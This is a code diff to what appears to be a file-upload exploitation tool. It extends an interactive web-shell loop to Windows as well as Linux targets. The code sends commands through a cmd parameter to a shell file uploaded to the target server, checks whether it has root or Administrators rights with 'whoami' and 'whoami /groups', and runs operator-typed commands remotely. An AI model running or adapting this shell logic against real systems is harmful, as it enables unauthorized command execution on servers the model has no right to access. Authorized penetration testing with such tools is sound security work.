@@ -12,7 +12,7 @@ from . import config
 import base64
 
 
-def web_shell(options, headers, file_name, parameter_exists):
+def web_shell(options, headers, file_name, parameter_exists, operating_system):
     # Loop to run user commands on the target machine
     while True:
         try:
@@ -23,19 +23,33 @@ def web_shell(options, headers, file_name, parameter_exists):
 
             file_name = unquote(file_name)
             partial_url = urljoin(options.url, options.upload_dir)
-            if parameter_exists:
-                final_url = f"{partial_url}{file_name}&cmd=whoami"
-            else:
-                final_url = f"{partial_url}{file_name}?cmd=whoami"
+            if operating_system == "Linux":
+                if parameter_exists:
+                    final_url = f"{partial_url}{file_name}&cmd=whoami"
+                else:
+                    final_url = f"{partial_url}{file_name}?cmd=whoami"
 
-            response, final_url = file_upload.send_get_request(headers, options, final_url)
+                response, final_url = file_upload.send_get_request(headers, options, final_url)    
+                # Display # if the shell is accessed with the root user
+                if 'root' in response.text:
+                    command = input(f"\n{green}└─# {reset}")  # User input command to execute on the target machine
+                # Display $ if the shell isn't accessed with the root user
+                else:
+                    command = input(f"\n{green}└─$ {reset}")  # User input command to execute on the target machine
 
-            # Display # if the shell is accessed with the root user
-            if 'root' in response.text:
-                command = input(f"\n{green}└─# {reset}")  # User input command to execute on the target machine
-            # Display $ if the shell isn't accessed with the root user
             else:
-                command = input(f"\n{green}└─$ {reset}")  # User input command to execute on the target machine
+                if parameter_exists:
+                    final_url = f"{partial_url}{file_name}&cmd=whoami /groups"
+                else:
+                    final_url = f"{partial_url}{file_name}?cmd=whoami /groups" 
+
+                response, final_url = file_upload.send_get_request(headers, options, final_url)
+                # Display # if the shell is accessed with the root user
+                if 'BUILTIN\Administrators' in response.text:
+                    command = input(f"\n[Administrator] > ")  # User input command to execute on the target machine
+                # Display $ if the shell isn't accessed with the root user
+                else:
+                    command = input(f"\n[User] > ")  # User input command to execute on the target machine
 
             cmd_encoded = urllib.parse.quote(command)  # Encode the user command
 
@@ -62,9 +76,8 @@ def web_shell(options, headers, file_name, parameter_exists):
             if 'clear' in user_command.lower():
                 print("\033c", end="")
             else:
-
                 # Display the command executed and the response received
-                alerts.info(f"URL: {final_url}")
+                alerts.info(f"URL: {final_url.lstrip()}")
 
         except KeyboardInterrupt:
 
@@ -121,11 +134,12 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
             file_upload.printing(options, user_options, response, file_name, 100, current_time,
                                  options.current_module, is_magic_bytes, options.current_mimetype)
 
-            alerts.warning("Interactive shell is activated, you can enter system commands: ")
+            alerts.warning("Interactive shell is activated, you can enter Linux system commands: ")
             results(options.url, file_name_to_save_in_file, content_type, upload_dir, is_magic_bytes,
                     options.output_dir, allowed_extension,
                     current_time)
-            web_shell(options, headers, file_name, parameter_exists)
+            operating_system = "Linux"
+            web_shell(options, headers, file_name, parameter_exists, operating_system)
 
         # Validating the shell
         if 'root' not in response.text:
@@ -140,11 +154,12 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
                     file_name = file_name.decode('latin-1')
                 file_upload.printing(options, user_options, response, file_name, 100, current_time,
                                      options.current_module, is_magic_bytes, options.current_mimetype)
-                alerts.warning("Interactive shell is activated, you can enter system commands: ")
+                alerts.warning("Interactive shell is activated, you can enter Windows system commands: ")
                 results(options.url, file_name_to_save_in_file, content_type, upload_dir, is_magic_bytes,
                         options.output_dir, allowed_extension,
                         current_time)
-                web_shell(options, headers, file_name, parameter_exists)
+                operating_system = "Windows"
+                web_shell(options, headers, file_name, parameter_exists, operating_system)
 
     else:
 
